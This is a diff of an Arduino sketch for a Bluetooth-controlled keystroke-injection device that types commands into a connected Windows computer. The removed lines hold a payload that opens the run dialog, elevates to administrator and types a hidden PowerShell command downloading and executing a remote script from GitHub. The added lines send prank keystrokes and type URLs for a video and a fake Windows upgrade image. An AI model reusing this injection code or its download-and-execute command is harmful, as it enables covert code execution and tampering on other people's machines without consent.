@@ -1,30 +1,3 @@
-void runCmd(char cmdString[]){
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.releaseAll();
-  delay(100);
-  Keyboard.println(cmdString);
-}
-
-void runCmdAsAdmin(char cmdString[]){
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.releaseAll();
-  delay(100);
-  Keyboard.print(cmdString);
-  delay(1800);
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_LEFT_SHIFT);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(1000);
-  Keyboard.press(KEY_LEFT_ARROW);
-  Keyboard.releaseAll();
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(200);
-}
-
-
-
 void setup() {
   Serial3.begin (9600);
 }
@@ -33,17 +6,64 @@ void loop() {
   char btRead;
   if (Serial3.available ()) {  
     btRead = Serial3.read();
-    if(btRead == '1'){
-       runCmdAsAdmin("powershell -windowstyle hidden -NoProfile -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/robertbarrett/bluetooth-hid/master/helloworld.ps1'))\"");
-       Serial3.println("\r\nPayload 1 sent");
+    if(btRead == 'h'||btRead == 'H'){
+       Serial3.println("\r\nOptions:\r\n1: Press Capslock\r\n2: Press F11\r\n3: Toggle Ctrl-Alt-Left/Ctrl-Alt-Right\r\n4: Press Alt+Shift\t(change language option 1)\r\n5: Press Alt+Capslock\t(change language option 2)\r\n6: Press Alt+Ctrl\t(change language option 3)\r\n7: Load Pen-Pineapple-Apple-Pen Video\r\n8: Load Win 10 Upgrade");
     }
-    if(btRead == '2'){
-       runCmd("powershell -windowstyle hidden -NoProfile -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/robertbarrett/bluetooth-hid/master/helloworld.ps1'))\"");
-       Serial3.print("\r\nPayload 2 sent\r\n");
+    if(btRead == '1'){
+       Keyboard.press(KEY_CAPS_LOCK);
+       Keyboard.releaseAll();
+       Serial3.println("\r\nCapsLock sent");
+    }
+    else if(btRead == '2'){
+       Keyboard.press(KEY_F11);
+       Keyboard.releaseAll();
+       Serial3.println("\r\nF11 sent sent");
     }
     else if(btRead == '3'){
-       runCmd("iexplore.exe https://www.youtube.com/watch?v=5j-sY41ru4M");
-       Serial3.print("\r\nPayload 3 sent\r\n");
+       Keyboard.press(KEY_LEFT_ALT);
+       Keyboard.press(KEY_LEFT_CTRL);
+       Keyboard.press(KEY_RIGHT_ARROW);
+       Keyboard.releaseAll();
+       delay(500);
+       Keyboard.press(KEY_LEFT_ALT);
+       Keyboard.press(KEY_LEFT_CTRL);
+       Keyboard.press(KEY_LEFT_ARROW);
+       Keyboard.releaseAll();
+       
+    }
+    else if(btRead == '4'){
+       Keyboard.press(KEY_LEFT_ALT);
+       Keyboard.press(KEY_LEFT_SHIFT);
+       Keyboard.releaseAll();
+       Serial3.println("\r\nAlt+Shift sent");
+    }
+    else if(btRead == '5'){
+       Keyboard.press(KEY_LEFT_ALT);
+       Keyboard.press(KEY_CAPS_LOCK);
+       Keyboard.releaseAll();
+       Serial3.println("\r\nAlt+CapsLock sent");
+    }
+    else if(btRead == '6'){
+       Keyboard.press(KEY_LEFT_ALT);
+       Keyboard.press(KEY_LEFT_CTRL);
+       Keyboard.releaseAll();
+       Serial3.println("\r\nAlt+CapsLock sent");
+    }
+    else if(btRead == '7'){
+       Keyboard.press(KEY_LEFT_ALT);
+       Keyboard.press(KEY_F2);
+       Keyboard.releaseAll();
+       delay(200);
+       Keyboard.println("https://www.youtube.com/watch?v=Ct6BUPvE2sM#t=5s");
+       Serial3.println("\r\nLoad Pen-Pineapple-Apple-Pen Video");
+    }
+    else if(btRead == '8'){
+       Keyboard.press(KEY_LEFT_ALT);
+       Keyboard.press(KEY_F2);
+       Keyboard.releaseAll();
+       delay(200);
+       Keyboard.println("https://i.imgsafe.org/c4d21a8ad4.png");
+       Serial3.println("\r\nLoad Win 10 Upgrade Message");
     }
   }
 }
